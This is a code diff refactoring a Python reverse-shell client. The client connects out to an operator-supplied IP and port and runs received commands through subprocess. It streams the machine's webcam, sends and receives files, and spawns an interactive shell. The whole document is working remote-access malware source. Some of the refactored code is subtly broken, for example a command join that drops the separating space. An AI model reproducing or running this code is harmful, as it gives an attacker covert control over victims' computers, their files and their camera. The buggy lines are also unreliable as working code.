@@ -1,62 +1,13 @@
-import socket
+from client import Client
+from webcam import VideoStream
+from transfer import FileTransfer
 import os
-import subprocess
 import sys
 import subprocess
-import cv2
-import pickle
-import struct
-import imutils
 import platform
-import time
 import threading
 import pty
-
-BUFFER_SIZE = 1024 * 128
-
-HEAD = 64
-
-class Client:
-	def __init__(self):
-		try:
-			port = int(sys.argv[2])
-		except ValueError:
-			print("The given port is not a number.\n"
-				"Usage: python3 revshell-client.py <ip> <port>")
-			exit(1)
-
-		self.s = socket.socket()
-		try:
-			self.s.connect((sys.argv[1], port))
-		except (socket.error):
-			print("[!] Couldn't connect to host.")
-			exit(1)
-
-	def send(self, msg):
-		msg = msg.encode()
-		try:
-			msg_size = str(len(msg)).encode()
-			msg_size += b' ' * (HEAD - len(msg_size))
-			self.s.sendall(msg_size)
-			self.s.sendall(msg)
-		except:
-			pass
-
-	def recvall(self, size):
-		ret = ''
-		while len(ret) < size:
-			ret += self.s.recv(size).decode()
-		return ret
-	
-	def recv(self):
-		msg_size = int(self.recvall(HEAD))
-		return self.recvall(msg_size)
-
-	def get_client_socket(self):
-		return self.s
-
-	def __del__(self):
-		self.s.close()
+import re
 
 # Supposed to be a stable bash shell, works
 # on the client but not on the server
@@ -103,84 +54,50 @@ def spawn_shell(s):
 	elif platform.system() == 'Windows':
 		windows_shell(s)
 
-# Capture video with webcam
+def parse_command(command):
+	if not command:
+		return None, None
 
-class VideoStream:
-	def __init__(self, s):
-		self.s = s
-
-	def send(self):
-		vid = cv2.VideoCapture(0)
-		while(vid.isOpened()):
-			img,frame = vid.read()
-			a = pickle.dumps(frame)
-			message = struct.pack("Q", len(a)) + a
-			self.s.sendall(message)
-
-class FileTransfer:
-	def __init__(self, s):
-		self.s = s
-
-	def send(self, file):
-		try:
-			file_size = os.stat(file).st_size
-		except FileNotFoundError:
-			self.s.send('0'.encode())
-			return
-		self.s.send((str(file_size) + '\n').encode())
-		with open(file, 'r') as f:
-			while file_size > 0:
-				data = f.readline()
-				file_size -= len(data)
-				self.s.send(data.encode())
-
-	def receive(self, recv_path):
-		splitted = self.s.recv(BUFFER_SIZE).decode().split('\n', 1)
-		file_size = int(splitted[0])
-		if file_size == 0:
-			print(f"Could not open file")
-			return
-		data = splitted[1]
-		with open(recv_path, 'w') as f:
-			while file_size > 0:
-				data = self.s.recv(BUFFER_SIZE).decode()
-				file_size -= len(data)
-				f.write(data)
-
+	command = re.split(' |\r|\t', command)
+	cmd = command[0]
+	args = command[1:]
+	return cmd, args
 
 def main():
-	client = Client()
+	try:
+		port = int(sys.argv[2])
+	except ValueError:
+		print("The given port is not a number.\n"
+			"Usage: python3 revshell-client.py <ip> <port>")
+		exit(1)
+	client = Client(sys.argv[1], port)
 	s = client.get_client_socket()
 	while True:
-		command = client.recv().strip()
-		print(command)
-		if not command:
+		cmd, args = parse_command(client.recv())
+		if not cmd or cmd == "exit":
 			break
-		splitted_command = command.split(" ", 1)
-		if command == "exit":
-			break
-		if splitted_command[0] == "cd":
+		if cmd == "cd":
 			try:
-				os.chdir(' '.join(splited_command[1:]))
+				os.chdir(args[0])
 			except FileNotFoundError as e:
 				output = str(e)
 			else:
 				output = ""
-		elif splitted_command[0] == "webcam":
+		elif cmd == "webcam":
 			stream = VideoStream(s)
 			stream.send()
-		elif splitted_command[0] == "download":
-			file = splitted_command[1]
-			transfer = FileTransfer(s)
+		elif cmd == "download":
+			file = args[0]
+			transfer = FileTransfer(client)
 			transfer.send(file)
-		elif splitted_command[0] == "upload":
-			path = splitted_command[1]
-			transfer = FileTransfer(s)
+		elif cmd == "upload":
+			path = args[1]
+			transfer = FileTransfer(client)
 			transfer.receive(path)
-		elif command == "shell":
+		elif cmd == "shell":
 			spawn_shell(s)
 		else:
-			output = subprocess.getoutput(command)
+			output = subprocess.getoutput(cmd + ' '.join(args))
 			client.send(output)
 	s.close()
 
